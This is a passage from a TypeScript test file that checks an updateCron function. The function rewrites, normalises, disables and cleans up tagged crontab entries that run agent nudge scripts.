    "30 7 * * * /home/you/agents/sprout/bin/cron-nudge-edit.sh # MC-CRON:edit";

  it("returns { ok: false } when the id is not found", () => {
    const deps = makeDeps([existingLine]);
    const result = updateCron(
      { id: "missing", schedule: "0 9 * * *", target: "sprout", message: "hi", enabled: true },
      deps
    );
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.error).toContain("missing");
    expect(deps.written).toHaveLength(0);
  });

  it("re-writes the crontab line in place with the new (normalised) schedule + message", () => {
    const deps = makeDeps([existingLine]);
    const result = updateCron(
      { id: "edit", schedule: "0 9 * * *", target: "sprout", message: "new prompt", enabled: true },
      deps
    );
    expect(result.ok).toBe(true);
    const content = deps.lines.join("\n");
    // New schedule present, old gone, tag + id preserved (same id keeps the entry).
    expect(content).toContain("0 9 * * *");
    expect(content).not.toContain("30 7 * * *");
    expect(content).toContain("# MC-CRON:edit");
    // The prompt + nudge script were re-written (agent mode = 2 writes).
    expect(deps.writeScript).toHaveBeenCalledTimes(2);
    const calls = (deps.writeScript as ReturnType<typeof vi.fn>).mock.calls as [string, string, number | undefined][];
    const promptCall = calls.find(([p]) => p.endsWith(".prompt.md"));
    expect(promptCall).toBeDefined();
    expect(promptCall![1]).toBe("new prompt");
  });

  it("normalises a messy-but-valid schedule before writing the crontab line", () => {
    const deps = makeDeps([existingLine]);
    const result = updateCron(
      { id: "edit", schedule: "  0   9   *   *   *  ", target: "sprout", message: "hi", enabled: true },
      deps
    );
    expect(result.ok).toBe(true);
    const content = deps.lines.join("\n");
    // Single-spaced normalised expression, not the raw padded input.
    expect(content).toContain("0 9 * * * /home/you/agents/sprout/bin/cron-nudge-edit.sh # MC-CRON:edit");
  });

  it("leaves untagged lines (mem-monitor / hand-added) untouched on edit", () => {
    const memLine = "*/3 * * * * /home/you/agents/mem-monitor.sh";
    const deps = makeDeps([memLine, existingLine]);
    const result = updateCron(
      { id: "edit", schedule: "0 9 * * *", target: "sprout", message: "hi", enabled: true },
      deps
    );
    expect(result.ok).toBe(true);
    expect(deps.lines.join("\n")).toContain(memLine);
  });

  it("disabling via edit (enabled=false) writes a commented DISABLED line", () => {
    const deps = makeDeps([existingLine]);
    const result = updateCron(
      { id: "edit", schedule: "0 9 * * *", target: "sprout", message: "hi", enabled: false },
      deps
    );
    expect(result.ok).toBe(true);
    const line = deps.lines.find((l) => l.includes("edit") && l.trim() !== "");
    expect(line).toBeDefined();
    expect(line!.trimStart()).toMatch(/^#/);
    expect(line).toContain("MC-CRON-DISABLED:edit");
  });

  it("cleans up old script files when the target changes", () => {
    const deps = makeDeps([existingLine]);
    const result = updateCron(
      { id: "edit", schedule: "0 9 * * *", target: "quill", message: "moved", enabled: true },
      deps
    );
    expect(result.ok).toBe(true);
    // New path under quill/, old sprout/ files deleted.
    const content = deps.lines.join("\n");
    expect(content).toContain("/home/you/agents/quill/bin/cron-nudge-edit.sh");
    const deletedPaths = (deps.deleteScript as ReturnType<typeof vi.fn>).mock.calls.map((c) => c[0] as string);
    expect(deletedPaths.some((p) => p === "/home/you/agents/sprout/bin/cron-nudge-edit.sh")).toBe(true);
    expect(deletedPaths.some((p) => p === "/home/you/agents/sprout/bin/cron-nudge-edit.prompt.md")).toBe(true);
  });
});
